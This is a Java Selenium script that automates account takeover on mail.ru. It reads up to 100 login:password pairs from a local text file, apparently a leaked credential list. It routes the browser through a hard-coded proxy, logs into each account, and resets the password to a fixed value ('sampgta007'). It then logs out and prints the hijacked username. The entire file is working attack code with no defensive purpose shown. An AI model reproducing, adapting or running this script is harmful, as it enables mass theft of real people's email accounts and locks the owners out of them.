package com.company;

import org.openqa.selenium.By;
import org.openqa.selenium.Proxy;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.remote.DesiredCapabilities;

import java.io.IOException;

public class Main {

    public static void main(String[] args) throws IOException {

        String filename = "C://8-9.txt";
        readLines m = new readLines();
        String[] lines;
        String[] cred = new String[2];
        String newPassword = "sampgta007";
        lines = m.read_Lines("C://8-9.txt");




        Proxy proxy = new Proxy();
        proxy.setHttpProxy("176.9.192.249:8888");
        proxy.setSslProxy("176.9.192.249:8888");
        DesiredCapabilities capabilities = DesiredCapabilities.chrome();
        capabilities.setCapability("proxy", proxy);
        ChromeOptions options = new ChromeOptions();
        capabilities.setCapability(ChromeOptions.CAPABILITY, options);
        WebDriver driver = new ChromeDriver(capabilities);
        driver.get("http://www.mail.ru");

        for (int i= 0 ; i<100 ; i++) {
            cred = lines[i].split(":",2);
            WebElement mail = driver.findElement(By.id("mailbox:login"));
            mail.clear();
            mail.sendKeys(cred[0]);
            mail = driver.findElement(By.id("mailbox:password"));
            mail.sendKeys(cred[1]);
            mail = driver.findElement(By.id("mailbox:submit")).findElement(By.tagName("input"));
            mail.click();
//            try {
//                Thread.sleep(14500);
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
//            mail = driver.findElement(By.xpath("//span[@class='c01138 c0183 c01136 c0181']"));
//            mail.click();
            try {
                Thread.sleep(12000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            mail = driver.findElement(By.xpath("//div/span/i[3]"));
            mail.click();
            try {
                Thread.sleep(15500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            mail = driver.findElement(By.xpath("//span[text()='Пароль и безопасность']"));
            mail.click();
        mail = driver.findElement(By.xpath("//span[text()='Изменить пароль']"));
        mail.click();
        try {
            Thread.sleep(3500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        mail = driver.findElement(By.xpath("//input[@class='c0168 c0169']"));
        mail.sendKeys(cred[1]);
        mail = driver.findElement(By.xpath("//input[@name='new-password']"));
        mail.sendKeys("sampgta007");
        mail = driver.findElement(By.xpath("//input[@data-test-id='repeat-password-input']"));
        mail.sendKeys("sampgta007");
        mail = driver.findElement(By.xpath("//button[@data-test-id='password-change-submit']"));
        mail.click();
        try {
            Thread.sleep(6500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        mail = driver.findElement(By.xpath("//span[@class='c0186 c0162 c0184 c0160']"));
        mail.click();
        mail = driver.findElement(By.xpath("//a[@id='PH_logoutLink']"));
        mail.click();
        System.out.println(cred[0]);
       }
    }
}
